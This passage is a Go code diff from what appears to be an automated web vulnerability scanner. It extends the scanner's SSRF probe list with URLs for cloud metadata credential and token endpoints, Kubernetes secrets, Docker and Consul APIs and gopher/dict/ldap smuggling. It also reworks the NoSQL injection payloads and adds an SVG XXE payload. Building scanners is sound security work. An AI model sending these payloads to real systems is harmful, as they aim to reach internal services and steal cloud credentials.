+			VulnClass:         p.VulnClass,
+			Technique:         p.Technique,
+			ProbeRole:         p.ProbeRole,
+			Steps:             steps,
+			Payloads:          []Payload{p},
+			EstimatedRequests: p.EstimatedRequests,
+			ShadowOnly:        true,
+		})
+	}
+	return out
+}
+
+func compareShadow(payloads []Payload, testCases []TestCase, budgetUsed int) ShadowComparison {
+	shadow := ShadowComparison{
+		LegacyPayloads: len(payloads), TestCases: len(testCases),
+		LegacyBudget: budgetUsed, EstimatedRequests: estimateRequests(payloads),
+	}
+	controls := map[string]bool{}
+	for _, p := range payloads {
+		if p.Family == "sqli" {
+			shadow.SQLiLegacyPayloads++
+		}
+		if p.IsControl || p.IsNegativeControl {
+			controls[p.SemanticKey] = true
+		}
+	}
+	shadow.SQLiTestCases = len(testCases)
+	for _, tc := range testCases {
+		for _, p := range tc.Payloads {
+			if p.ControlFor != "" && !controls[p.ControlFor] {
+				shadow.OrphanControls++
+			}
+		}
+	}
+	return shadow
+}
+
 func UpdateLearning(learn LearningProfile, family, outcome string) LearningProfile {
 	switch outcome {
 	case "worked":
@@ -1271,15 +1494,39 @@ func ssrfPayloads(oastURL string) []Payload {
 		priority               int
 	}{
 		{"internal_ip", "http://127.0.0.1/", "internal_ip", 80},
+		{"internal_localhost", "http://localhost/", "internal_ip", 80},
 		{"internal_ip_decimal", "http://2130706433/", "internal_ip", 78},
+		{"internal_ip_hex", "http://0x7f000001/", "internal_ip", 78},
+		{"internal_ip_octal", "http://0177.0.0.1/", "internal_ip", 78},
 		{"internal_ip_ipv6", "http://[::1]/", "internal_ip", 77},
 		{"internal_ip_ipv6_compat", "http://[0000:0000:0000:0000:0000:ffff:7f00:0001]/", "internal_ip", 76},
+		{"internal_ip_zero", "http://0.0.0.0/", "internal_ip", 76},
+		{"internal_ip_short", "http://127.1/", "internal_ip", 75},
+		{"internal_127_port", "http://127.0.0.1:8080/", "internal_ip", 78},
+		{"internal_localhost_port", "http://localhost:8080/", "internal_ip", 78},
 		{"aws_metadata", "http://169.254.169.254/latest/meta-data/", "aws_metadata", 85},
+		{"aws_iam_credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_metadata", 85},
+		{"aws_dynamic_identity", "http://169.254.169.254/latest/dynamic/instance-identity/document", "aws_metadata", 84},
 		{"aws_metadata_decimal", "http://2852039166/latest/meta-data/", "aws_metadata", 83},
-		{"gcp_metadata", "http://metadata.google.internal/", "gcp_metadata", 82},
+		{"aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "aws_metadata", 83},
+		{"aws_metadata_octal", "http://0251.0372.0251.0372/latest/meta-data/", "aws_metadata", 83},
+		{"aws_imds_v2_token", "http://169.254.169.254/latest/api/token", "aws_metadata", 82},
+		{"gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata", 82},
+		{"gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_metadata", 82},
 		{"azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata", 82},
-		{"protocol_smuggling", "gopher://127.0.0.1:25/", "protocol_smuggling", 70},
-		{"localhost_wildcard", "http://127.0.0.1.nip.io/", "internal_ip", 75},
+		{"azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "azure_metadata", 82},
+		{"alibaba_metadata", "http://100.100.100.200/latest/meta-data/", "alibaba_metadata", 80},
+		{"do_metadata", "http://169.254.169.254/metadata/v1.json", "do_metadata", 80},
+		{"oracle_metadata", "http://192.0.0.192/latest/meta-data/", "oracle_metadata", 80},
+		{"kubernetes_internal_secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "internal_ip", 79},
+		{"kubernetes_service_token", "file:///var/run/secrets/kubernetes.io/serviceaccount/token", "internal_ip", 79},
+		{"docker_api", "http://127.0.0.1:2375/version", "internal_ip", 76},
+		{"consul_api", "http://127.0.0.1:8500/v1/agent/self", "internal_ip", 76},
+		{"protocol_smuggling_redis", "gopher://127.0.0.1:6379/_PING%0d%0a", "protocol_smuggling", 70},
+		{"protocol_smuggling_dict", "dict://127.0.0.1:11211/stat", "protocol_smuggling", 70},
+		{"protocol_smuggling_ldap", "ldap://127.0.0.1:389/o=base", "protocol_smuggling", 70},
+		{"dns_rebind_nip_io", "http://127.0.0.1.nip.io/", "internal_ip", 75},
+		{"dns_rebind_imds_nip_io", "http://169.254.169.254.nip.io/latest/meta-data/", "aws_metadata", 75},
 	}
 	var out []Payload
 	for _, pr := range probes {
@@ -1308,19 +1555,61 @@ func lfiPayloads(oastURL string) []Payload {
 
 func nosqlPayloads(p reflection.ReflectionProfile) []Payload {
 	var out []Payload
-	add := func(variant, value, signal string, prio int) {
+	probes := nosql.ProbesForTarget(p.Parameter, p.EndpointURL, p.ContentType, p.Method)
+	for _, probe := range probes {
+		prio := nosqlPriority(probe)
 		out = append(out, Payload{
-			Value: value, VulnClass: "nosql", Variant: variant, Family: "nosql",
-			ExpectedSignal: signal, Priority: prio, BudgetCost: 2,
+			Value: nosqlPayloadValue(probe, p.Parameter), VulnClass: "nosql", Variant: probe.Name, Family: "nosql",
+			ExpectedSignal: probe.Signal, Priority: prio, BudgetCost: 2,
 			VerificationStrategy: "differential_compare", NoiseLevel: "medium",
+			TransportEncoding: nosqlTransportEncoding(probe),
 		})
 	}
-	add("ne_operator", `{"$ne":null}`, "operator_injection", 72)
-	add("gt_operator", `{"$gt":""}`, "operator_injection", 70)
-	add("regex_operator", `{"$regex":".*"}`, "regex_injection", 68)
-	add("where_js", `{"$where":"this.password.match(/.*/)"}`, "where_injection", 64)
-	add("js_truthy", `' || '1'=='1`, "js_injection", 62)
 	return out
+}
+
+func nosqlPayloadValue(probe nosql.Probe, parameter string) string {
+	if probe.Value != "" {
+		return probe.Value
+	}
+	if probe.Mode == "bracket_query" {
+		op := "$ne"
+		if probe.Name == "bracket_gt" {
+			op = "$gt"
+		}
+		return parameter + "[" + op + "]=akca"
+	}
+	return probe.Name
+}
+
+func nosqlPriority(probe nosql.Probe) int {
+	switch probe.Signal {
+	case "auth_bypass":
+		return 78
+	case "operator_injection":
+		return 72
+	case "regex_injection":
+		return 68
+	case "where_injection":
+		return 64
+	case "js_injection":
+		return 62
+	case "bracket_injection":
+		return 66
+	default:
+		return 60
+	}
+}
+
+func nosqlTransportEncoding(probe nosql.Probe) string {
+	switch probe.Mode {
+	case "json_body":
+		return "json"
+	case "bracket_query":
+		return "query"
+	default:
+		return ""
+	}
 }
 
 func shouldIncludeNoSQLi(in Input) bool {
@@ -1332,18 +1621,7 @@ func shouldIncludeNoSQLi(in Input) bool {
 		ct := strings.ToLower(in.Profile.ContentType)
 		return ct == "" || strings.Contains(ct, "json")
 	}
-	db := strings.ToLower(in.Tech.Database)
-	if strings.Contains(db, "mongo") {
-		return true
-	}
-	ct := strings.ToLower(in.Profile.ContentType)
-	if !strings.Contains(ct, "json") {
-		return false
-	}
-	lang := strings.ToLower(in.Tech.BackendLanguage)
-	fw := strings.ToLower(in.Tech.Framework)
-	return strings.Contains(lang, "node") || strings.Contains(lang, "javascript") ||
-		strings.Contains(fw, "express") || strings.Contains(fw, "nestjs") || strings.Contains(fw, "koa")
+	return true
 }
 
 func xxePayloads(oastURL string) []Payload {
@@ -1351,6 +1629,7 @@ func xxePayloads(oastURL string) []Payload {
 		groupBPayload("xxe", "classic_entity", `<!DOCTYPE foo [<!ENTITY xxe "AKCA_XXE_TEST">]><root>&xxe;</root>`, "classic_entity", 84, 2),
 		// SOAP XXE payload must be standard-compliant. DOCTYPE must be placed before the root soap:Envelope element.
 		groupBPayload("xxe", "soap_xxe", `<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe "AKCA_XXE_TEST">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>`, "soap_xxe", 78, 2),
+		groupBPayload("xxe", "svg_xxe", `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe "AKCA_XXE_TEST" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`, "classic_entity", 80, 2),
 	}
 	if strings.TrimSpace(oastURL) != "" {
 		body := `<!DOCTYPE foo [<!ENTITY % x SYSTEM "` + oastURL + `"><!ENTITY call SYSTEM "file:///nonexistent">%x;]><root/>`
